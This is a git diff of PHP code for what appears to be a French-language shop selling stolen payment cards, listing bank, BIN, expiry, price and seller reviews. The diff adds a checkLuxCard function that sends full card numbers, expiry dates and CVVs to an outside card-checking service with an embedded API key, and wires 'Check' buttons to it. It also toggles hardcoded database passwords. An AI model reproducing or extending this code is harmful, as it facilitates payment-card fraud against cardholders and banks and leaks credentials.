@@ -10,10 +10,10 @@ class databaseConnection {
     private $user = "root";
 
     // Décommente la ligne ci-dessous pour le dev
-    //private $password = "Azerty75*";
+    private $password = "Azerty75*";
 
     // Décommente la ligne ci dessous pour la prod
-    private $password = "Bretzel*password93";
+   //private $password = "Bretzel*password93";
 
     private $dbName = "autoshop";
 
@@ -705,8 +705,8 @@ class databaseConnection {
                             <td class=' dt-center' style=''>{$result['banque']}</td>
                             <td class=' dt-center'><small>{$result['country']}<small></small></small></td>
                             <td class=' dt-center'>{$result['price']}</td>
-                            <td class=' dt-center' style=''><a href='http://144.202.124.151/main/store.php?id={$result['id_seller']}'>{$result['username']}</a><br><span class='badge badge-success'>{$good_reviews} </span> <span class='badge badge-danger'>{$bad_reviews}</span></td>
-                            <td style='width: 20px' class=' dt-center'><a href='http://144.202.124.151/action/add/buy.php?id={$result['id_card']}' id='buythis' type='button' class='btn btn-light btn--icon' data-id='8'><i class='fas fa-shopping-cart'></i></a></td>
+                            <td class=' dt-center' style=''><a href='http://localhost/as_bretzel/main/store.php?id={$result['id_seller']}'>{$result['username']}</a><br><span class='badge badge-success'>{$good_reviews} </span> <span class='badge badge-danger'>{$bad_reviews}</span></td>
+                            <td style='width: 20px' class=' dt-center'><a href='http://localhost/as_bretzel/action/add/buy.php?id={$result['id_card']}' id='buythis' type='button' class='btn btn-light btn--icon' data-id='8'><i class='fas fa-shopping-cart'></i></a></td>
                             </tr>";
             
             }
@@ -773,7 +773,7 @@ class databaseConnection {
                             <td style='width: 30px' class=' dt-center'>{$bin}</td>
                             <td style='width: 20px' class=' dt-center'>{$result['exp']}</td>
                             <td style='width: 20px' class=' dt-center'>{$result['price']}</td>
-                            <td style='width: 30px' class=' dt-center' style=''><a href='http://144.202.124.151/main/store.php?id={$result['id_seller']}'>{$result['username']}</a><br><span class='badge badge-success'>{$good_reviews} </span> <span class='badge badge-danger'>{$bad_reviews}</span></td>
+                            <td style='width: 30px' class=' dt-center' style=''><a href='http://localhost/as_bretzel/main/store.php?id={$result['id_seller']}'>{$result['username']}</a><br><span class='badge badge-success'>{$good_reviews} </span> <span class='badge badge-danger'>{$bad_reviews}</span></td>
                             <td style='width: 20px' class=' dt-center'>
                                 <a class='btn btn-info' href='?id={$result['id_card']}#modale_view_card'>View</a>
                             </tr>";
@@ -830,6 +830,15 @@ class databaseConnection {
         } else {
             return 0;
         }
+    }
+
+    public function checkLuxCard($numeros, $expm, $expy, $cvv){
+        $url = 'https://luxchecker.pw/apiv2/ck.php?cardnum=' . $numeros . '&expm=' .$expm. '&expy='.$expy.'&cvv='.$cvv.'&key=ed6158932dc835664b45841ecf18b817&username=bretzel';
+
+        $json = file_get_contents($url);
+        $obj = json_decode($json);
+
+        return $obj->error;
     }
 
     public function autocompleteCard($id_card, $banque, $level, $country){
@@ -966,6 +975,7 @@ class databaseConnection {
                                         cards.numeros,
                                         cards.seller,
                                         cards.exp,
+                                        cards.cvv,
                                         cards.checked,
                                         orders.id as id_order,
                                         orders.date,
@@ -1007,6 +1017,9 @@ class databaseConnection {
                 $bin = str_replace(" ", "", $result['numeros']);
                 $bin = substr($bin, 0, 6);
 
+                $expm = explode("/", $result['exp'])[0];
+                $expy = explode("/", $result['exp'])[1];
+
                 $seller = $this->getSellerName($result['seller']);
 
                 $good_reviews = $this->getSellerGoodReviews($result['seller']);
@@ -1036,7 +1049,7 @@ class databaseConnection {
                                         <a href='../action/add/bad_review.php?seller={$result['seller']}&type_product={$result['type_product']}&id_product={$result['id_card']}&id_order={$result['id_order']}' style='font-weight: bold;' class='btn btn-danger'>-</a>
                                     </td>
                                     <td style='width: 24px' class=' dt-center'>
-                                        <a style='color: #333;{$display_check}' class='btn btn-warning'>Check ({$time_left} min restantes)</a>
+                                        <a href='http://localhost/as_bretzel/action/update/check_lux_card.php?numeros={$result['numeros']}&expm={$expm}&expy={$expy}&cvv={$result['cvv']}' style='color: #333;{$display_check}' class='btn btn-warning'>Check ({$time_left} min restantes)</a>
                                         <a href='?id={$result['id_card']}#modale_view_purchased_card' style='color: #fff;' class='btn btn-info'>Voir</a>
                                         <a href='../action/delete/delete_purchased_card.php?order={$result['id_order']}' style='color: #fff;' class='btn btn-danger'>Supprimer</a>
                                     </td>
@@ -1048,7 +1061,7 @@ class databaseConnection {
                                     <td style='width: 24px' class=' dt-center'>{$seller}</td>
                                     <td style='width: 35px' class=' dt-center'><span class='badge badge-primary'>Déjà feed</span></td>
                                     <td style='width: 120px' class=' dt-center'>
-                                        <a style='color: #333;{$display_check}' class='btn btn-warning'>Check ({$time_left} min restantes)</a>
+                                        <a href='http://localhost/as_bretzel/action/update/check_lux_card.php?numeros={$result['numeros']}&expm={$expm}&expy={$expy}&cvv={$result['cvv']}' style='color: #333;{$display_check}' class='btn btn-warning'>Check ({$time_left} min restantes)</a>
                                         <a href='?id={$result['id_card']}#modale_view_purchased_card' style='color: #fff;' class='btn btn-info'>Voir</a>
                                         <a href='../action/delete/delete_purchased_card.php?order={$result['id_order']}' style='color: #fff;' class='btn btn-danger'>Supprimer</a>
                                     </td>
@@ -1251,7 +1264,7 @@ class databaseConnection {
                                
                 $html .= "<tr role='row' class='odd'>
                             <td style='width: 250px;' class=' dt-center'>{$result['date']}</td>
-                            <td class=' dt-center'><a class='btn btn-light' href=' http://144.202.124.151/main/tickets.php?id={$result['id']}'>{$result['object']}</a></td>
+                            <td class=' dt-center'><a class='btn btn-light' href=' http://localhost/as_bretzel/main/tickets.php?id={$result['id']}'>{$result['object']}</a></td>
                             <td style='width: 29px;' class=' dt-center'><span class='{$badge}'>{$result['status']}</span></td>
                             </tr>";
             }
@@ -1310,7 +1323,7 @@ class databaseConnection {
                 $html .= "<tr role='row' class='odd'>
                             <td class=' dt-center'>{$result['date']}</td>
                             <td class=' dt-center'><span class='badge badge-info'>{$result['username']}</span></td>
-                            <td class=' dt-center'><a class='btn btn-light' href=' http://144.202.124.151/main/tickets.php?id={$result['id']}'>{$result['object']}</a></td>
+                            <td class=' dt-center'><a class='btn btn-light' href=' http://localhost/as_bretzel/main/tickets.php?id={$result['id']}'>{$result['object']}</a></td>
                             <td class=' dt-center'><span class='{$badge}'>{$result['status']}</span></td>
                           </tr>";
             }
